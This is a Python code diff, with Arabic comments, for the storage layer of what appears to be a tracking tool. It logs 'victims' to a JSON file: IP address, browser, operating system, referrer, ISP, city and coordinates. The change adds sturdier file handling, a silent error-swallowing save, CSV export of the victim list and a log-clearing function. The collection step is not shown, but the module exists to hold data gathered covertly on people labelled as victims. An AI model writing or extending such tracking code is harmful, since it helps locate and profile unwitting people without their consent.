@@ -2,6 +2,8 @@ import json
 import os
 import re
 from datetime import datetime
+import pandas as pd
+import io
 
 VICTIMS_FILE = 'victims.json'
 
@@ -103,16 +105,22 @@ def load_victims():
     """تحميل قائمة الضحايا من الملف"""
     if not os.path.exists(VICTIMS_FILE):
         return []
-    with open(VICTIMS_FILE, 'r', encoding='utf-8') as f:
-        try:
-            return json.load(f)
-        except json.JSONDecodeError:
-            return []
+    try:
+        with open(VICTIMS_FILE, 'r', encoding='utf-8') as f:
+            content = f.read().strip()
+            if not content:
+                return []
+            return json.loads(content)
+    except (json.JSONDecodeError, Exception):
+        return []
 
 def save_victims(victims):
     """حفظ قائمة الضحايا في الملف"""
-    with open(VICTIMS_FILE, 'w', encoding='utf-8') as f:
-        json.dump(victims, f, indent=4, ensure_ascii=False)
+    try:
+        with open(VICTIMS_FILE, 'w', encoding='utf-8') as f:
+            json.dump(victims, f, indent=4, ensure_ascii=False)
+    except Exception:
+        pass
 
 def log_victim_data(ip_address, user_agent, referrer, geo_data=None):
     """تسجيل بيانات الضحية مع تحليل شامل"""
@@ -149,33 +157,24 @@ def log_victim_data(ip_address, user_agent, referrer, geo_data=None):
         'longitude': longitude,
         'isp': isp,
         'referrer': referrer,
-        'user_agent': user_agent,
-        'full_geo_data': geo_data
+        'user_agent': user_agent
     }
     
     victims.append(victim_entry)
     save_victims(victims)
 
-def get_victims_data():
-    """الحصول على قائمة الضحايا"""
+def get_all_victims():
+    """الحصول على قائمة الضحايا (الاسم المطلوب في app.py)"""
     return load_victims()
 
-def get_victims_summary():
-    """الحصول على ملخص بيانات الضحايا للعرض في الجدول"""
+def get_victims_as_csv():
+    """تحويل بيانات الضحايا إلى تنسيق CSV"""
     victims = load_victims()
-    summary = []
-    
-    for victim in victims:
-        summary.append({
-            'timestamp': victim.get('timestamp', 'Unknown'),
-            'ip_address': victim.get('ip_address', 'Unknown'),
-            'browser': victim.get('browser', 'Unknown'),
-            'os': victim.get('os', 'Unknown'),
-            'device_type': victim.get('device_type', 'Unknown'),
-            'country': victim.get('country', 'Unknown'),
-            'city': victim.get('city', 'Unknown'),
-            'isp': victim.get('isp', 'Unknown'),
-            'referrer': victim.get('referrer', 'Unknown')
-        })
-    
-    return summary
+    if not victims:
+        return ""
+    df = pd.DataFrame(victims)
+    return df.to_csv(index=False).encode('utf-8-sig')
+
+def clear_victims_log():
+    """مسح سجل الضحايا"""
+    save_victims([])
